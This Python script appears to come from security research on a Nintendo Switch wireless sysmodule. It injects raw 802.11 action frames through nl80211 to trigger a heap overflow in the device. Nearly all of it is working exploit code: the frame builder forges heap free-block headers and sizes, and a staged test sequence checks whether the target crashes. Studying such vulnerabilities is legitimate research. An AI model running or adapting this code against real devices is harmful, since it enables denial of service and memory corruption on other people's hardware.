#!/usr/bin/env -S python3 -u
"""Clean test: verify single-overflow stability and two-stage crash.

The two_stage_heap test showed crashes everywhere, including the baseline.
This may be accumulated corruption from prior tests. This script:
1. First verifies that a single overflow (correct FR) is STILL safe
2. Then tests if a second round of frames causes a crash
"""

import os
import struct
import socket
import time
import subprocess
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
LP2P_HEADER = b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_overflow_body(free_size=0x20, fill=0x00):
    """Build body_size=0x800 with optional fill and forged free block size."""
    body_size = 0x800
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    struct.pack_into(">H", body, 0x1DA, 0x0100)

    if fill != 0x00:
        for i in range(0x57C, body_size):
            body[i] = fill

    # Correct free block header at body[0x750:0x768]
    struct.pack_into("<H", body, 0x750, 0x4652)
    struct.pack_into("<H", body, 0x752, 0x0001)
    struct.pack_into("<I", body, 0x754, free_size)
    # prev=0, next=0 (already zero or overwriting fill)
    struct.pack_into("<Q", body, 0x758, 0)
    struct.pack_into("<Q", body, 0x760, 0)

    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=45):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def send_and_check(fam_id, ifindex, name, body, frame_count=80, wait_time=5):
    """Send frames and check if sysmodule survives."""
    frame = build_frame(body)
    for i in range(frame_count):
        send_frame(fam_id, ifindex, frame)
        time.sleep(0.002)

    time.sleep(wait_time)
    a1 = check_alive()
    time.sleep(3)
    a2 = check_alive()
    p = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                        capture_output=True).returncode == 0

    if a2 and p:
        result = "OK"
    elif p:
        result = "HTTP_DOWN"
    else:
        result = "CRASH"

    print(f"  {name:55s} → {result}")
    return result


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")

    results = {}

    # Step 0: Verify sysmodule is healthy
    print("\n  Verifying Switch is alive...")
    if not check_alive():
        print("  Switch is DOWN. Waiting for recovery...")
        if not wait_alive(60):
            print("  Switch did not recover. Exiting.")
            return
    print("  Switch is alive and responding.")

    # Step 1: Single overflow with zero fill + correct FR (should be safe)
    print(f"\n{'='*65}")
    print("  TEST 1: Single overflow, zero fill, correct FR (baseline)")
    print("="*65)

    r = send_and_check(fam_id, ifindex,
        "single_zero_fill_FR_0x20",
        build_overflow_body(free_size=0x20, fill=0x00))
    results["single_zero_FR_0x20"] = r
    if r != "OK":
        time.sleep(15)
        wait_alive(45)

    # Step 2: Single overflow with 0x41 fill + correct FR (also should be safe)
    print(f"\n{'='*65}")
    print("  TEST 2: Single overflow, 0x41 fill, correct FR")
    print("="*65)

    if not check_alive():
        wait_alive(45)

    r = send_and_check(fam_id, ifindex,
        "single_0x41_fill_FR_0x20",
        build_overflow_body(free_size=0x20, fill=0x41))
    results["single_0x41_FR_0x20"] = r
    if r != "OK":
        time.sleep(15)
        wait_alive(45)

    # Step 3: Two consecutive overflows (same payload, back to back)
    print(f"\n{'='*65}")
    print("  TEST 3: Two consecutive overflows (same payload)")
    print("="*65)

    if not check_alive():
        wait_alive(45)

    body = build_overflow_body(free_size=0x20, fill=0x00)
    frame = build_frame(body)

    # Round 1
    for i in range(80):
        send_frame(fam_id, ifindex, frame)
        time.sleep(0.002)
    time.sleep(3)
    a1 = check_alive()
    print(f"  After round 1: {'alive' if a1 else 'DEAD'}")

    if a1:
        # Round 2 (same payload)
        for i in range(80):
            send_frame(fam_id, ifindex, frame)
            time.sleep(0.002)
        time.sleep(3)
        a2 = check_alive()
        time.sleep(3)
        a3 = check_alive()
        p = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                            capture_output=True).returncode == 0
        if a3 and p:
            result = "OK"
        elif p:
            result = "HTTP_DOWN"
        else:
            result = "CRASH"
        print(f"  After round 2: {result}")
        results["two_consecutive_zero"] = result
    else:
        print(f"  Crashed on round 1!")
        results["two_consecutive_zero"] = "CRASH_R1"

    if results.get("two_consecutive_zero") != "OK":
        time.sleep(15)
        wait_alive(45)

    # Step 4: Two consecutive with forged size (stage 1 = forge, stage 2 = normal)
    print(f"\n{'='*65}")
    print("  TEST 4: Stage1=forge(0x10000) → Stage2=zero_fill(FR_0x20)")
    print("="*65)

    if not check_alive():
        wait_alive(45)

    forge_body = build_overflow_body(free_size=0x10000, fill=0x00)
    normal_body = build_overflow_body(free_size=0x20, fill=0x00)

    # Stage 1 (forge)
    frame1 = build_frame(forge_body)
    for i in range(80):
        send_frame(fam_id, ifindex, frame1)
        time.sleep(0.002)
    time.sleep(3)
    a1 = check_alive()
    print(f"  After stage 1 (forge): {'alive' if a1 else 'DEAD'}")

    if a1:
        # Stage 2 (normal)
        frame2 = build_frame(normal_body)
        for i in range(80):
            send_frame(fam_id, ifindex, frame2)
            time.sleep(0.002)
        time.sleep(3)
        a2 = check_alive()
        time.sleep(3)
        a3 = check_alive()
        p = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                            capture_output=True).returncode == 0
        if a3 and p:
            result = "OK"
        elif p:
            result = "HTTP_DOWN"
        else:
            result = "CRASH_S2"
        print(f"  After stage 2: {result}")
        results["forge_then_normal"] = result
    else:
        results["forge_then_normal"] = "CRASH_S1"

    if results.get("forge_then_normal") != "OK":
        time.sleep(15)
        wait_alive(45)

    # Step 5: Two consecutive with forged size (both stages forge)
    print(f"\n{'='*65}")
    print("  TEST 5: Stage1=forge(0x10000) → Stage2=forge(0x10000)")
    print("="*65)

    if not check_alive():
        wait_alive(45)

    frame = build_frame(build_overflow_body(free_size=0x10000, fill=0x00))
    for i in range(80):
        send_frame(fam_id, ifindex, frame)
        time.sleep(0.002)
    time.sleep(3)
    a1 = check_alive()
    print(f"  After round 1: {'alive' if a1 else 'DEAD'}")

    if a1:
        for i in range(80):
            send_frame(fam_id, ifindex, frame)
            time.sleep(0.002)
        time.sleep(3)
        a2 = check_alive()
        time.sleep(3)
        a3 = check_alive()
        p = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                            capture_output=True).returncode == 0
        result = "OK" if a3 and p else "HTTP_DOWN" if p else "CRASH"
        print(f"  After round 2: {result}")
        results["forge_forge"] = result
    else:
        results["forge_forge"] = "CRASH_R1"

    # Summary
    print(f"\n{'='*65}")
    print("  SUMMARY")
    print("="*65)
    for k, v in results.items():
        marker = " ***" if v not in ("OK", None) else ""
        print(f"  {k:50s} → {v}{marker}")

    outfile = str(_LDN_ROOT / "evidence" / "action_frame_overflow" / "clean_stage_test.json")
    with open(outfile, "w") as f:
        json.dump({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"), "results": results}, f, indent=2)
    print(f"\n  Saved to {outfile}")


if __name__ == "__main__":
    main()
